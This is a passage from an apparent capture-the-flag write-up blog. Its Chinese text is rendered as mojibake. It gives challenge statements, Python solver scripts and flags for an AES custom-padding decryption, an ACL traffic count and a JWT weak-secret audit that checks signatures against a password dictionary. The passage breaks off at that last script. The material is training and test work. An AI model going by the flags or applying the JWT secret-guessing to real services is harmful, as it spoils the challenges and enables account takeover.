class="hljs-string">f&quot;è¿è§„è®°å½•: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span>)<br><br>    md5_val = hashlib.md5(output.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;md5_val&#125;</span>&#125;&#125;&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>æ£€æµ‹å‡ºè¿è§„è®°å½•ä¸º</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">è¿è§„è®°å½•: 4<span class="hljs-string">-380</span>,2<span class="hljs-string">-703</span>,4<span class="hljs-string">-862</span>,1<span class="hljs-string">-1056</span>,1<span class="hljs-string">-1243</span>,1<span class="hljs-string">-1360</span>,3<span class="hljs-string">-1395</span>,3<span class="hljs-string">-1433</span>,3<span class="hljs-string">-1553</span>,2<span class="hljs-string">-1644</span>,3<span class="hljs-string">-1838</span>,3<span class="hljs-string">-1872</span>,2<span class="hljs-string">-2101</span>,2<span class="hljs-string">-2113</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>ff4054d20e07b42411bded1d6d895cf&#125;<br></code></pre></td></tr></table></figure><h2 id="AES-Custom-Padding"><a href="#AES-Custom-Padding" class="headerlink" title="AES_Custom_Padding"></a>AES_Custom_Padding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">èƒŒæ™¯ï¼šæŸç³»ç»Ÿå¯¹å¤‡ä»½æ•°æ®ä½¿ç”¨ AES-<span class="hljs-number">128</span>-CBC åŠ å¯†ï¼Œä½†é‡‡ç”¨äº†è‡ªå®šä¹‰å¡«å……ï¼š<br><br>åœ¨æ˜æ–‡æœ«å°¾æ·»åŠ ä¸€ä¸ªå­—èŠ‚ <span class="hljs-number">0x80</span>ï¼›<br>ä¹‹åä½¿ç”¨ <span class="hljs-number">0x00</span> è¿›è¡Œå¡«å……ç›´åˆ°è¾¾åˆ° <span class="hljs-number">16</span> å­—èŠ‚å—é•¿ã€‚ ï¼ˆæ³¨æ„ï¼šå¦‚æœæ˜æ–‡æ°å¥½æ˜¯å—é•¿æ•´æ•°å€ï¼ŒåŒæ ·éœ€è¦è¿½åŠ ä¸€ä¸ªå®Œæ•´å¡«å……å— <span class="hljs-number">0x80</span> + <span class="hljs-number">0x00</span>*<span class="hljs-number">15</span>ï¼‰<br>å·²çŸ¥ï¼š<br><br>Keyï¼ˆ<span class="hljs-built_in">hex</span>ï¼‰ï¼š0123456789ABCDEF0123456789ABCDEF<br>IV ï¼ˆ<span class="hljs-built_in">hex</span>ï¼‰ï¼š<span class="hljs-number">000</span>102030405060708090A0B0C0D0E0F<br>åŠ å¯†æ–‡ä»¶ï¼šcipher.<span class="hljs-built_in">bin</span>ï¼ˆBase64 ç¼–ç çš„å¯†æ–‡ï¼‰<br>ä»»åŠ¡ï¼šç¼–å†™è§£å¯†ç¨‹åºï¼Œä½¿ç”¨ç»™å®š Key/IV è¿›è¡Œ AES-<span class="hljs-number">128</span>-CBC è§£å¯†ï¼Œå¹¶æŒ‰ä¸Šè¿°è‡ªå®šä¹‰å¡«å……å»é™¤å¡«å……ï¼Œå¾—åˆ°æ˜æ–‡ã€‚<br></code></pre></td></tr></table></figure><p>æ‰“å¼€é™„ä»¶æ‹¿åˆ°å¯†æ–‡</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WU</span>+<span class="hljs-number">8</span>dpscYYw+q52uQqX8OPiesnTajq++AXj05zX3u9an27JZR9/<span class="hljs-number">31</span>yZaWdtPM5df<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_custom_padding</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    i = <span class="hljs-built_in">len</span>(data) - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> i &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> data[i] == <span class="hljs-number">0x00</span>:<br>        i -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> data[i] != <span class="hljs-number">0x80</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Invalid padding&quot;</span>)<br>    <span class="hljs-keyword">return</span> data[:i]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_cbc_decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span>, iv: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    plaintext_padded = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> remove_custom_padding(plaintext_padded)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    key = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;0123456789ABCDEF0123456789ABCDEF&quot;</span>)<br>    iv = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;000102030405060708090A0B0C0D0E0F&quot;</span>)<br>    b64_ciphertext = <span class="hljs-string">&quot;WU+8dpscYYw+q52uQqX8OPiesnTajq++AXj05zX3u9an27JZR9/31yZaWdtPM5df&quot;</span><br>    ciphertext = base64.b64decode(b64_ciphertext)<br><br>    <span class="hljs-keyword">try</span>:<br>        plaintext = aes_cbc_decrypt(ciphertext, key, iv)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†æ˜æ–‡(utf-8è§£ç å°è¯•):&quot;</span>)<br>        <span class="hljs-built_in">print</span>(plaintext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†æˆ–å»å¡«å……å‡ºé”™:&quot;</span>, e)<br><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;T1s_4ll_4b0ut_AES_custom_padding!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ACL-Allow-Count"><a href="#ACL-Allow-Count" class="headerlink" title="ACL_Allow_Count"></a>ACL_Allow_Count</h2><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pf">ACL è§„åˆ™åŒ¹é…ä¸å…è®¸æ¡æ•°ç»Ÿè®¡<br><br>è¯´æ˜ï¼šç»™å®š <span class="hljs-number">3</span> æ¡ ACL è§„åˆ™ä¸ <span class="hljs-number">2000</span> æ¡æµé‡æ—¥å¿—ï¼ˆrules.txt, traffic.txtï¼‰ã€‚<br><br>è§„åˆ™æ ¼å¼ï¼š<span class="hljs-variable">&lt;action&gt;</span> <span class="hljs-variable">&lt;proto&gt;</span> <span class="hljs-variable">&lt;src&gt;</span> <span class="hljs-variable">&lt;dst&gt;</span> <span class="hljs-variable">&lt;dport&gt;</span><br>action: allow/deny<br><span class="hljs-keyword">proto</span>: tcp/udp/<span class="hljs-literal">any</span><br>src/dst: IPv4 æˆ– CIDR æˆ– <span class="hljs-literal">any</span><br>dport: ç«¯å£å·æˆ– <span class="hljs-literal">any</span><br>æµé‡æ ¼å¼ï¼š<span class="hljs-variable">&lt;proto&gt;</span> <span class="hljs-variable">&lt;src&gt;</span> <span class="hljs-variable">&lt;dst&gt;</span> <span class="hljs-variable">&lt;dport&gt;</span><br>åŒ¹é…åŸåˆ™ï¼šè‡ªä¸Šè€Œä¸‹ first-matchï¼›è‹¥æ— åŒ¹é…åˆ™é»˜è®¤ denyã€‚<br><br>ä»»åŠ¡ï¼šç»Ÿè®¡è¢«å…è®¸ï¼ˆallowï¼‰çš„æµé‡æ¡æ•°å¹¶è¾“å‡ºè¯¥æ•°å­—ï¼Œflagæ ¼å¼ï¼šflag&#123;allowæµé‡æ¡æ•°&#125;<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ipaddress<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_rules</span>(<span class="hljs-params">filename=<span class="hljs-string">&quot;rules.txt&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä»æ–‡ä»¶ä¸­è¯»å–å¹¶è§£æACLè§„åˆ™ã€‚</span><br><span class="hljs-string">    ä¸ºäº†æé«˜åŒ¹é…æ•ˆç‡ï¼ŒIPåœ°å€/CIDRä¼šé¢„å¤„ç†æˆip_networkå¯¹è±¡ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    rules = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                parts = line.strip().split()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) == <span class="hljs-number">5</span>:<br>                    action, proto, src, dst, dport = parts<br>                    <span class="hljs-comment"># ä½¿ç”¨ipaddressæ¨¡å—å¤„ç†æºå’Œç›®æ ‡åœ°å€</span><br>                    <span class="hljs-comment"># strict=Falseå…è®¸å°†å•ä¸ªIPåœ°å€ï¼ˆå¦‚1.1.1.1ï¼‰è§†ä¸º/32çš„CIDR</span><br>                    src_net = ipaddress.ip_network(src, strict=<span class="hljs-literal">False</span>) <span class="hljs-keyword">if</span> src != <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;any&#x27;</span><br>                    dst_net = ipaddress.ip_network(dst, strict=<span class="hljs-literal">False</span>) <span class="hljs-keyword">if</span> dst != <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;any&#x27;</span><br>                    rules.append(&#123;<br>                        <span class="hljs-string">&#x27;action&#x27;</span>: action,<br>                        <span class="hljs-string">&#x27;proto&#x27;</span>: proto,<br>                        <span class="hljs-string">&#x27;src&#x27;</span>: src_net,<br>                        <span class="hljs-string">&#x27;dst&#x27;</span>: dst_net,<br>                        <span class="hljs-string">&#x27;dport&#x27;</span>: dport<br>                    &#125;)<br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: è§„åˆ™æ–‡ä»¶ &#x27;<span class="hljs-subst">&#123;filename&#125;</span>&#x27; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿æ–‡ä»¶å­˜åœ¨äºåŒä¸€ç›®å½•ä¸­ã€‚&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: è§„åˆ™æ–‡ä»¶ &#x27;<span class="hljs-subst">&#123;filename&#125;</span>&#x27; ä¸­å­˜åœ¨æ— æ•ˆçš„IPåœ°å€æˆ–CIDR: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> rules<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_traffic</span>(<span class="hljs-params">rules, traffic_filename=<span class="hljs-string">&quot;traffic.txt&quot;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¤„ç†æµé‡æ—¥å¿—ï¼Œæ ¹æ®ACLè§„åˆ™è¿›è¡ŒåŒ¹é…å¹¶ç»Ÿè®¡å…è®¸çš„æµé‡æ•°ã€‚</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    allowed_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(traffic_filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>                traffic_parts = line.strip().split()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(traffic_parts) != <span class="hljs-number">4</span>:<br>                    <span class="hljs-keyword">continue</span><br><br>                t_proto, t_src, t_dst, t_dport = traffic_parts<br><br>                <span class="hljs-keyword">try</span>:<br>                    t_src_ip = ipaddress.ip_address(t_src)<br>                    t_dst_ip = ipaddress.ip_address(t_dst)<br>                <span class="hljs-keyword">except</span> ValueError:<br>                    <span class="hljs-comment"># è·³è¿‡æ ¼å¼ä¸æ­£ç¡®çš„æµé‡æ—¥å¿—è¡Œ</span><br>                    <span class="hljs-keyword">continue</span><br><br>                <span class="hljs-comment"># é»˜è®¤åŠ¨ä½œä¸ºdenyï¼Œæ­¤å˜é‡è®°å½•åŒ¹é…åˆ°çš„æœ€ç»ˆåŠ¨ä½œ</span><br>                final_action = <span class="hljs-string">&#x27;deny&#x27;</span><br><br>                <span class="hljs-comment"># è‡ªä¸Šè€Œä¸‹åŒ¹é…è§„åˆ™ï¼ˆFirst-matchï¼‰</span><br>                <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> rules:<br>                    <span class="hljs-comment"># æ£€æŸ¥åè®®</span><br>                    proto_match = (rule[<span class="hljs-string">&#x27;proto&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> rule[<span class="hljs-string">&#x27;proto&#x27;</span>] == t_proto)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> proto_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># æ£€æŸ¥æºIP</span><br>                    src_match = (rule[<span class="hljs-string">&#x27;src&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> t_src_ip <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;src&#x27;</span>])<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> src_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># æ£€æŸ¥ç›®æ ‡IP</span><br>                    dst_match = (rule[<span class="hljs-string">&#x27;dst&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> t_dst_ip <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;dst&#x27;</span>])<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dst_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># æ£€æŸ¥ç›®æ ‡ç«¯å£</span><br>                    dport_match = (rule[<span class="hljs-string">&#x27;dport&#x27;</span>] == <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">or</span> rule[<span class="hljs-string">&#x27;dport&#x27;</span>] == t_dport)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> dport_match:<br>                        <span class="hljs-keyword">continue</span><br><br>                    <span class="hljs-comment"># å¦‚æœæ‰€æœ‰æ¡ä»¶éƒ½åŒ¹é…ï¼Œåˆ™ç¡®å®šäº†åŠ¨ä½œï¼Œå¹¶åœæ­¢ç»§ç»­åŒ¹é…</span><br>                    final_action = rule[<span class="hljs-string">&#x27;action&#x27;</span>]<br>                    <span class="hljs-keyword">break</span><br><br>                <span class="hljs-comment"># å¦‚æœæœ€ç»ˆåŠ¨ä½œä¸ºallowï¼Œåˆ™è®¡æ•°å™¨åŠ ä¸€</span><br>                <span class="hljs-keyword">if</span> final_action == <span class="hljs-string">&#x27;allow&#x27;</span>:<br>                    allowed_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯: æµé‡æ–‡ä»¶ &#x27;<span class="hljs-subst">&#123;traffic_filename&#125;</span>&#x27; æœªæ‰¾åˆ°ã€‚è¯·ç¡®ä¿æ–‡ä»¶å­˜åœ¨äºåŒä¸€ç›®å½•ä¸­ã€‚&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> allowed_count<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 1. è§£æè§„åˆ™</span><br>    acl_rules = parse_rules()<br><br>    <span class="hljs-comment"># 2. å¤„ç†æµé‡å¹¶ç»Ÿè®¡</span><br>    total_allowed = process_traffic(acl_rules)<br><br>    <span class="hljs-comment"># 3. æŒ‰è¦æ±‚æ ¼å¼è¾“å‡ºç»“æœ</span><br>    flag = <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;total_allowed&#125;</span>&#125;&#125;&quot;</span><br>    <span class="hljs-built_in">print</span>(flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>å¾—åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1729</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="JWT-Weak-Secret"><a href="#JWT-Weak-Secret" class="headerlink" title="JWT_Weak_Secret"></a>JWT_Weak_Secret</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs stylus">é¢˜ç›®æè¿°<br>æœ¬é¢˜ç›®æ¨¡æ‹ŸçœŸå®åœºæ™¯ä¸­çš„JWTï¼ˆJSON Web Tokenï¼‰å®‰å…¨å®¡è®¡ä»»åŠ¡ï¼Œéœ€è¦æ£€æµ‹ä½¿ç”¨å¼±å¯†é’¥ç­¾åçš„JWTä»¤ç‰Œï¼Œå¹¶è¯†åˆ«å…·æœ‰ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·ã€‚<br><br>ä»»åŠ¡è¦æ±‚<br><span class="hljs-number">1</span>ã€ç­¾åéªŒè¯ï¼š<br>å¯¹äºHS256ç®—æ³•çš„JWTï¼šä½¿ç”¨å­—å…¸ä¸­çš„å¯†ç é€ä¸€å°è¯•éªŒè¯ç­¾å<br>å¯¹äºRS256ç®—æ³•çš„JWTï¼šä½¿ç”¨æä¾›çš„å…¬é’¥éªŒè¯ç­¾å<br><br><span class="hljs-number">2</span>ã€æƒé™æ£€æŸ¥ï¼š<br>æ£€æŸ¥JWTè½½è·ä¸­çš„ç®¡ç†å‘˜æƒé™æ ‡è¯†<br>ç®¡ç†å‘˜æƒé™æ¡ä»¶ï¼šadmin=true æˆ– role âˆˆ &#123;admin, superuser&#125;<br><br><span class="hljs-number">3</span>ã€ç»Ÿè®¡ç»“æœï¼š<br>ç»Ÿè®¡åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶çš„JWTä»¤ç‰Œæ•°é‡ï¼š<br>ç­¾åéªŒè¯é€šè¿‡<br>å…·æœ‰ç®¡ç†å‘˜æƒé™<br>flagæ ¼å¼ï¼šflag&#123;<span class="hljs-selector-tag">a</span>:<span class="hljs-selector-tag">b</span>:c...&#125;,<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>,cæ˜¯ä»¤ç‰Œåºå·ï¼Œä»å°åˆ°å¤§çš„é¡ºåºã€‚<br><br>JWTè½½è·ç»“æ„ç¤ºä¾‹<br>&#123;<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1721995200</span>,           <span class="hljs-comment">// ç­¾å‘æ—¶é—´</span><br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1722038400</span>,           <span class="hljs-comment">// è¿‡æœŸæ—¶é—´</span><br>  <span class="hljs-string">&quot;sub&quot;</span>: <span class="hljs-string">&quot;alice&quot;</span>,              <span class="hljs-comment">// ç”¨æˆ·æ ‡è¯†</span><br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;svc-auth&quot;</span>,           <span class="hljs-comment">// ç­¾å‘è€…</span><br>  <span class="hljs-string">&quot;admin&quot;</span>: true,               <span class="hljs-comment">// ç®¡ç†å‘˜æ ‡è¯†ï¼ˆæ–¹å¼1ï¼‰</span><br>  <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>              <span class="hljs-comment">// è§’è‰²æ ‡è¯†ï¼ˆæ–¹å¼2ï¼‰</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span 